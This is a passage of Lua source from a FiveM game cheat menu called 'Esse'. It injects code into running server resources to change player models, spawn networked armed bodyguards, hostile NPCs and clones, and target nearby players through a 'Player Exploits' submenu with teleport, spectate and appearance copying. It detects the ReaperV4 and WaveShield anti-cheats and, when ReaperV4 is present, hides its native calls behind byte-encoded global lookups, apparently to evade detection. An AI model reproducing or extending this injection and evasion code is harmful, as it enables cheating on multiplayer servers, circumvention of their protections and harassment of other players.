                                        local function PqLoMzNkXjWvRu(component, exclude)
                                            local ped = UwEsDxCfVbGtHy()
                                            local total = FdSaQwErTyUiOp(ped, component)
                                            if total <= 1 then return 0 end
                                            local choice = exclude
                                            while choice == exclude do
                                                choice = math.random(0, total - 1)
                                            end
                                            return choice
                                        end

                                        local function OxVnBmCxZaSqWe(component)
                                            local ped = UwEsDxCfVbGtHy()
                                            local total = FdSaQwErTyUiOp(ped, component)
                                            return total > 1 and math.random(0, total - 1) or 0
                                        end

                                        local ped = UwEsDxCfVbGtHy()

                                        QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                        QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                        QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                        QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                        QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                        local face = math.random(0, 45)
                                        local skin = math.random(0, 45)
                                        LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                        local hairMax = FdSaQwErTyUiOp(ped, 2)
                                        local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                        QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                        MnBgVfCdXsZaQw(ped, 0, 0)

                                        local brows = RtYuIoPlMnBvCx(2)
                                        TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                        ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                        DfGhJkLzXcVbNm(ped, 0)
                                        DfGhJkLzXcVbNm(ped, 1)
                                    end

                                    UxrKYLp378()
                                ]])
                                end
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        {
                            type = "scrollable",
                            label = "Freemode",
                            desc = "Apply a ped model",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Freemode Male", "Freemode Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                local selected = "%s"
                                local pedModel = nil

                                if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                end

                                if pedModel then
                                    local modelHash = GetHashKey(pedModel)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do
                                        Wait(0)
                                    end

                                    SetPlayerModel(PlayerId(), modelHash)
                                    SetModelAsNoLongerNeeded(modelHash)

                                    local playerPed = PlayerPedId()
                                    SetPedDefaultComponentVariation(playerPed)
                                    SetPedRandomComponentVariation(playerPed, true)
                                    SetPedRandomProps(playerPed)
                                    SetEntityInvincible(playerPed, false)
                                    ClearPedTasksImmediately(playerPed)

                                    print("Changed ped to: " .. pedModel)
                                else
                                    print("Invalid ped selected: " .. tostring(selected))
                                end
                            ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Peds",
                            desc = "Apply a native ped",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade",
                                "Dave Norton",
                                "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad",
                                "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male",
                                "Sheriff Female",
                                "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
                                "Construction Worker", "Pilot Male", "Pilot Female", "Business Male",
                                "Business Female",
                                "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1",
                                "Ballas 2", "Ballas Female",
                                "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2",
                                "Lost MC Female",
                                "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard",
                                "Cop Undercover",
                                "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1",
                                "Prostitute 2",
                                "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater",
                                "Hipster Male", "Hipster Female",
                                "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver",
                                "Gardener", "Farmer",
                                "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
                                "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
                                "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female",
                                "Tennis Player Male", "Tennis Player Female"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                local selected = "%s"
                                local pedModel = nil

                                if selected == "Michael" then pedModel = "player_zero"
                                elseif selected == "Franklin" then pedModel = "player_one"
                                elseif selected == "Trevor" then pedModel = "player_two"
                                elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                elseif selected == "Ron" then pedModel = "ig_ronsch"
                                elseif selected == "Wade" then pedModel = "ig_wade"
                                elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                elseif selected == "Floyd" then pedModel = "ig_floyd"
                                elseif selected == "Chef" then pedModel = "ig_chef"
                                elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                elseif selected == "Chop" then pedModel = "a_c_chop"
                                elseif selected == "Brad" then pedModel = "ig_brad"
                                elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                end

                                if pedModel then
                                    local modelHash = GetHashKey(pedModel)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do
                                        Wait(0)
                                    end

                                    SetPlayerModel(PlayerId(), modelHash)
                                    SetModelAsNoLongerNeeded(modelHash)

                                    local playerPed = PlayerPedId()
                                    SetPedDefaultComponentVariation(playerPed)
                                    SetPedRandomComponentVariation(playerPed, true)
                                    SetPedRandomProps(playerPed)
                                    SetEntityInvincible(playerPed, false)
                                    ClearPedTasksImmediately(playerPed)

                                    print("Changed ped to: " .. pedModel)
                                else
                                    print("Invalid ped selected: " .. tostring(selected))
                                end
                            ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Animal Peds",
                            desc = "Apply a animal ped",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow",
                                "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky",
                                "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle",
                                "Pug", "Poodle", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
                                "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark",
                                "Hammerhead Shark", "Cow", "Cat2", "Chickenhawk", "Cormorant",
                                "Coyote2", "Chimp2", "Boar2", "Deer2", "Fish2", "Husky2",
                                "Pug2", "Poodle2", "Retriever2", "Shepherd2", "Rat2", "Rabbit2",
                                "Dolphin2", "Killer Whale2", "Mountain Lion2", "Pig2", "Seagull2",
                                "Stingray2", "Tiger Shark2", "Hammerhead Shark2"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                local selected = "%s"
                                local pedModel = nil

                                if selected == "Boar" then
                                    pedModel = "a_c_boar"
                                elseif selected == "Cat" then
                                    pedModel = "a_c_cat_01"
                                elseif selected == "Chicken" then
                                    pedModel = "a_c_hen"
                                elseif selected == "Chimp" then
                                    pedModel = "a_c_chimp"
                                elseif selected == "Cow" then
                                    pedModel = "a_c_cow"
                                elseif selected == "Coyote" then
                                    pedModel = "a_c_coyote"
                                elseif selected == "Crow" then
                                    pedModel = "a_c_crow"
                                elseif selected == "Deer" then
                                    pedModel = "a_c_deer"
                                elseif selected == "Dolphin" then
                                    pedModel = "a_c_dolphin"
                                elseif selected == "Fish" then
                                    pedModel = "a_c_fish"
                                elseif selected == "Hen" then
                                    pedModel = "a_c_hen"
                                elseif selected == "Humpback" then
                                    pedModel = "a_c_humpback"
                                elseif selected == "Husky" then
                                    pedModel = "a_c_husky"
                                elseif selected == "Killer Whale" then
                                    pedModel = "a_c_killerwhale"
                                elseif selected == "Mountain Lion" then
                                    pedModel = "a_c_mtlion"
                                elseif selected == "Pig" then
                                    pedModel = "a_c_pig"
                                elseif selected == "Pigeon" then
                                    pedModel = "a_c_pigeon"
                                elseif selected == "Poodle" then
                                    pedModel = "a_c_poodle"
                                elseif selected == "Pug" then
                                    pedModel = "a_c_pug"
                                elseif selected == "Rabbit" then
                                    pedModel = "a_c_rabbit_01"
                                elseif selected == "Rat" then
                                    pedModel = "a_c_rat"
                                elseif selected == "Retriever" then
                                    pedModel = "a_c_retriever"
                                elseif selected == "Rhesus Monkey" then
                                    pedModel = "a_c_rhesus"
                                elseif selected == "Rottweiler" then
                                    pedModel = "a_c_rottweiler"
                                elseif selected == "Seagull" then
                                    pedModel = "a_c_seagull"
                                elseif selected == "Shepherd" then
                                    pedModel = "a_c_shepherd"
                                elseif selected == "Stingray" then
                                    pedModel = "a_c_stingray"
                                elseif selected == "Tiger Shark" then
                                    pedModel = "a_c_sharktiger"
                                elseif selected == "Hammerhead Shark" then
                                    pedModel = "a_c_sharkhammer"
                                elseif selected == "Chickenhawk" then
                                    pedModel = "a_c_chickenhawk"
                                elseif selected == "Cormorant" then
                                    pedModel = "a_c_cormorant"
                                else
                                    pedModel = nil
                                end

                                if pedModel then
                                    local modelHash = GetHashKey(pedModel)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do
                                        Wait(0)
                                    end

                                    SetPlayerModel(PlayerId(), modelHash)
                                    SetModelAsNoLongerNeeded(modelHash)

                                    local playerPed = PlayerPedId()
                                    SetPedDefaultComponentVariation(playerPed)
                                    SetPedRandomComponentVariation(playerPed, true)
                                    SetPedRandomProps(playerPed)
                                    SetEntityInvincible(playerPed, false)
                                    ClearPedTasksImmediately(playerPed)

                                    print("Changed ped to: " .. pedModel)
                                else
                                    print("Invalid animal selected: " .. tostring(selected))
                                end
                            ]]):format(value))
                            end
                        },
                    }
                },
                {
                    label = "Ped/NPC",
                    tabs = {
                        { type = "divider", label = "Ped/NPC" },
                        {
                            type = "scrollable",
                            label = "Spawn Bodyguards",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "1 Bodyguard", "2 Bodyguards", "3 Bodyguards", "5 Bodyguards" },
                            desc = "Spawn armed NPCs that follow and protect you.",
                            onSelect = function(value)
                                local count = tonumber(value:match("%d+")) or 1
                                Esse:Notify("success", "Esse", "Spawning " .. count .. " Bodyguard(s)", 3000)
                                MachoInjectResourceRaw("any", string.format([[
                                local count = %d
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local models = {"s_m_y_blackops_01", "s_m_y_swat_01", "s_m_m_marine_01", "s_m_y_marine_02"}
                                local weapons = {"WEAPON_CARBINERIFLE", "WEAPON_ASSAULTRIFLE", "WEAPON_SMG", "WEAPON_COMBATPISTOL"}

                                for i = 1, count do
                                    local modelName = models[(i %% #models) + 1]
                                    local modelHash = GetHashKey(modelName)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(10) end

                                    local offsetX = math.random(-3, 3)
                                    local offsetY = math.random(-3, 3)
                                    local spawnCoords = vector3(playerCoords.x + offsetX, playerCoords.y + offsetY, playerCoords.z)

                                    local ped = CreatePed(4, modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, GetEntityHeading(playerPed), true, true)
                                    SetModelAsNoLongerNeeded(modelHash)

                                    -- Make visible to others
                                    NetworkRegisterEntityAsNetworked(ped)
                                    local netId = NetworkGetNetworkIdFromEntity(ped)
                                    SetNetworkIdCanMigrate(netId, true)
                                    SetNetworkIdExistsOnAllMachines(netId, true)
                                    SetEntityAsMissionEntity(ped, true, true)

                                    local weaponHash = GetHashKey(weapons[(i %% #weapons) + 1])
                                    GiveWeaponToPed(ped, weaponHash, 9999, false, true)
                                    SetPedArmour(ped, 100)
                                    SetPedAccuracy(ped, 100)

                                    local group = GetPedGroupIndex(playerPed)
                                    if group == 0 then
                                        group = CreateGroup(0)
                                        SetPedAsGroupLeader(playerPed, group)
                                    end
                                    SetPedAsGroupMember(ped, group)
                                    SetPedNeverLeavesGroup(ped, true)
                                    SetGroupFormation(group, 3)
                                    SetPedCombatAbility(ped, 100)
                                    SetPedCombatMovement(ped, 2)
                                    SetPedCombatRange(ped, 2)
                                    SetPedRelationshipGroupHash(ped, GetHashKey("PLAYER"))
                                end
                            ]], count))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Hostile NPCs",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "1 Hostile", "3 Hostiles", "5 Hostiles", "10 Hostiles" },
                            desc = "Spawn hostile NPCs at player location (attacks nearby).",
                            onSelect = function(value)
                                local count = tonumber(value:match("%d+")) or 1
                                Esse:Notify("warning", "Esse", "Spawning " .. count .. " Hostile NPC(s)",
                                    3000)
                                MachoInjectResourceRaw("any", string.format([[
                                local count = %d
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local models = {"g_m_y_ballaorig_01", "g_m_y_mexgoon_01", "g_m_y_lost_01", "g_m_y_famca_01"}
                                local weapons = {"WEAPON_PISTOL", "WEAPON_MICROSMG", "WEAPON_PUMPSHOTGUN", "WEAPON_KNIFE"}

                                for i = 1, count do
                                    local modelName = models[(i %% #models) + 1]
                                    local modelHash = GetHashKey(modelName)
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(10) end

                                    local offsetX = math.random(-10, 10)
                                    local offsetY = math.random(-10, 10)
                                    local spawnCoords = vector3(playerCoords.x + offsetX, playerCoords.y + offsetY, playerCoords.z)

                                    local ped = CreatePed(4, modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, math.random(0, 360), true, true)
                                    SetModelAsNoLongerNeeded(modelHash)

                                    -- Make visible to others
                                    NetworkRegisterEntityAsNetworked(ped)
                                    local netId = NetworkGetNetworkIdFromEntity(ped)
                                    SetNetworkIdCanMigrate(netId, true)
                                    SetNetworkIdExistsOnAllMachines(netId, true)
                                    SetEntityAsMissionEntity(ped, true, true)

                                    local weaponHash = GetHashKey(weapons[(i %% #weapons) + 1])
                                    GiveWeaponToPed(ped, weaponHash, 9999, false, true)
                                    SetPedCombatAbility(ped, 100)
                                    SetPedCombatMovement(ped, 2)
                                    SetPedCombatRange(ped, 2)
                                    SetPedRelationshipGroupHash(ped, GetHashKey("HATES_PLAYER"))
                                    TaskCombatPed(ped, playerPed, 0, 16)
                                end
                            ]], count))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Animals",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "Dog (Husky)", "Dog (Rottweiler)", "Dog (Shepherd)", "Cat", "Mountain Lion", "Boar", "Deer", "Cow", "Shark (Tiger)", "Shark (Hammerhead)" },
                            desc = "Spawn various animals at your location.",
                            onSelect = function(value)
                                Esse:Notify("success", "Esse", "Spawning " .. value, 3000)
                                local animalModels = {
                                    ["Dog (Husky)"] = "a_c_husky",
                                    ["Dog (Rottweiler)"] = "a_c_rottweiler",
                                    ["Dog (Shepherd)"] = "a_c_shepherd",
                                    ["Cat"] = "a_c_cat_01",
                                    ["Mountain Lion"] = "a_c_mtlion",
                                    ["Boar"] = "a_c_boar",
                                    ["Deer"] = "a_c_deer",
                                    ["Cow"] = "a_c_cow",
                                    ["Shark (Tiger)"] = "a_c_sharktiger",
                                    ["Shark (Hammerhead)"] = "a_c_sharkhammer"
                                }
                                local model = animalModels[value] or "a_c_husky"
                                MachoInjectResourceRaw("any", string.format([[
                                local modelHash = GetHashKey("%s")
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(10) end

                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local spawnCoords = vector3(playerCoords.x + 2.0, playerCoords.y + 2.0, playerCoords.z)

                                local animal = CreatePed(28, modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, GetEntityHeading(playerPed), true, true)
                                SetModelAsNoLongerNeeded(modelHash)

                                -- Make visible to others
                                NetworkRegisterEntityAsNetworked(animal)
                                local netId = NetworkGetNetworkIdFromEntity(animal)
                                SetNetworkIdCanMigrate(netId, true)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetEntityAsMissionEntity(animal, true, true)

                                SetPedRelationshipGroupHash(animal, GetHashKey("PLAYER"))
                            ]], model))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Clones",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "1 Clone", "3 Clones", "5 Clones", "10 Clones" },
                            desc = "Spawn multiple clones of yourself.",
                            onSelect = function(value)
                                local count = tonumber(value:match("%d+")) or 1
                                Esse:Notify("success", "Esse", "Spawning " .. count .. " Clone(s)", 3000)
                                MachoInjectResourceRaw("any", string.format([[
                                local count = %d
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local playerHeading = GetEntityHeading(playerPed)
                                local modelHash = GetEntityModel(playerPed)

                                for i = 1, count do
                                    RequestModel(modelHash)
                                    while not HasModelLoaded(modelHash) do Wait(10) end

                                    local angle = (i / count) * 360.0
                                    local rad = math.rad(angle)
                                    local offsetX = math.cos(rad) * 3.0
                                    local offsetY = math.sin(rad) * 3.0
                                    local spawnCoords = vector3(playerCoords.x + offsetX, playerCoords.y + offsetY, playerCoords.z)

                                    local clone = CreatePed(4, modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, playerHeading, true, true)

                                    -- Make visible to others
                                    NetworkRegisterEntityAsNetworked(clone)
                                    local netId = NetworkGetNetworkIdFromEntity(clone)
                                    SetNetworkIdCanMigrate(netId, true)
                                    SetNetworkIdExistsOnAllMachines(netId, true)
                                    SetEntityAsMissionEntity(clone, true, true)

                                    -- Copy appearance
                                    for comp = 0, 11 do
                                        local drawable = GetPedDrawableVariation(playerPed, comp)
                                        local texture = GetPedTextureVariation(playerPed, comp)
                                        SetPedComponentVariation(clone, comp, drawable, texture, 0)
                                    end

                                    for prop = 0, 2 do
                                        local propIndex = GetPedPropIndex(playerPed, prop)
                                        local propTexture = GetPedPropTextureIndex(playerPed, prop)
                                        if propIndex ~= -1 then
                                            SetPedPropIndex(clone, prop, propIndex, propTexture, true)
                                        end
                                    end

                                    SetPedRelationshipGroupHash(clone, GetHashKey("PLAYER"))
                                    SetModelAsNoLongerNeeded(modelHash)
                                end
                            ]], count))
                            end
                        },
                        { type = "divider", label = "Management" },
                        {
                            type = "button",
                            label = "Delete All Spawned NPCs",
                            desc = "Remove all NPCs you've spawned.",
                            onSelect = function()
                                Esse:Notify("success", "Esse", "Deleting Nearby NPCs", 3000)
                                MachoInjectResourceRaw("any", [[
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)
                                local peds = GetGamePool('CPed')
                                local deleted = 0

                                for _, ped in ipairs(peds) do
                                    if ped ~= playerPed and DoesEntityExist(ped) then
                                        local pedCoords = GetEntityCoords(ped)
                                        local distance = #(playerCoords - pedCoords)
                                        if distance < 50.0 and not IsPedAPlayer(ped) then
                                            DeleteEntity(ped)
                                            deleted = deleted + 1
                                        end
                                    end
                                end
                                print("[Esse] Deleted " .. deleted .. " nearby NPCs")
                            ]])
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Player Exploits",
            type = "subMenu",
            categories = {
                {
                    label = "List",
                    tabs = {
                        {
                            type = "button",
                            label = "Clear Selection",
                            desc = "Clear all selected players",
                            onSelect = function()
                                CPlayers = {}
                                if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
                                    local category = CurrentCategories[CurrentCategoryIndex]
                                    if category.label == "List" and category.tabs then
                                        for _, tab in ipairs(category.tabs) do
                                            if tab.type == "checkbox" then
                                                tab.checked = false
                                            end
                                        end
                                    end
                                end
                                Esse:UpdateElements(CurrentMenu)
                                Esse:Notify("success", "Esse", "Selection cleared!", 2000)
                            end
                        },
                        { type = "divider", label = "Nearby Players", desc = "Nearby players will appear here" },
                    }
                },
                {
                    label = "Safe",
                    tabs = {
                        {
                            type = "button",
                            label = "Teleport to Player",
                            desc = 'This will teleport you to the selected player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "Esse",
                                            "There was an error while trying to teleport to that player! (ERR:1)",
                                            3000)
                                        CPlayers[targetPlayer] = nil
                                        Esse:UpdateListMenu()
                                        return
                                    end

                                    local playerPed = GetPlayerPed(player)
                                    local playerCoords = GetEntityCoords(playerPed)
                                    local playerHeading = GetEntityHeading(playerPed)

                                    SetEntityCoords(PlayerPedId(), playerCoords.x, playerCoords.y, playerCoords.z,
                                        false, false, false, false)
                                    SetEntityHeading(PlayerPedId(), playerHeading)
                                    self:Notify("success", "Esse",
                                        ("You have teleported to %s - [%s]!"):format(
                                        GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Spectate Player",
                            checked = false,
                            desc = 'This will attempt to Spectate the player',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                self:HandleSpectateToggle(targetPlayer, checked)
                            end
                        },
                        {
                            type = "button",
                            label = "Copy Appearance",
                            desc = 'Copy Players Clothing (Visible to Others)',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    Esse:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetServerId = targetPlayers[1]
                                local ReaperV4Started = GetResourceState("ReaperV4") == 'started'
                                local WaveShieldStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if ReaperV4Started then
                                    MachoInjectThread(0, "any", "", string.format([[
                                    local function _b(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return t
                                    end
                                    local function _d(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end
                                    local function _g(n)
                                        local k = _d(n)
                                        local f = _G[k]
                                        return f
                                    end
                                    local function findClientIdByServerId(sid)
                                        local players = _g(_b("GetActivePlayers"))()
                                        for _, pid in ipairs(players) do
                                            if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                return pid
                                            end
                                        end
                                        return -1
                                    end

                                    local function CopyClothing(targetSid)
                                        local clientId = findClientIdByServerId(targetSid)
                                        if clientId == -1 then
                                            print("^1[ERROR] Client ID not found for Server ID: " .. targetSid .. "^0")
                                            return
                                        end

                                        local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                        local myPed = _g(_b("PlayerPedId"))()

                                        if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                            print("^2[Esse] Copying clothing from Server ID: " .. targetSid .. "^0")

                                            -- Copy all clothing components (visible to others)
                                            for comp = 0, 11 do
                                                local drawable = _g(_b("GetPedDrawableVariation"))(targetPed, comp)
                                                local texture = _g(_b("GetPedTextureVariation"))(targetPed, comp)
                                                _g(_b("SetPedComponentVariation"))(myPed, comp, drawable, texture, 0)
                                            end

                                            -- Copy face blend data
                                            local blendData = {}
                                            _g(_b("GetPedHeadBlendData"))(targetPed, blendData)
                                            _g(_b("SetPedHeadBlendData"))(myPed, blendData[1], blendData[2], blendData[3], blendData[4], blendData[5], blendData[6], blendData[7], blendData[8], blendData[9], blendData[10])

                                            -- Copy hair color
                                            local hairColor, highlightColor = _g(_b("GetPedHairColor"))(targetPed)
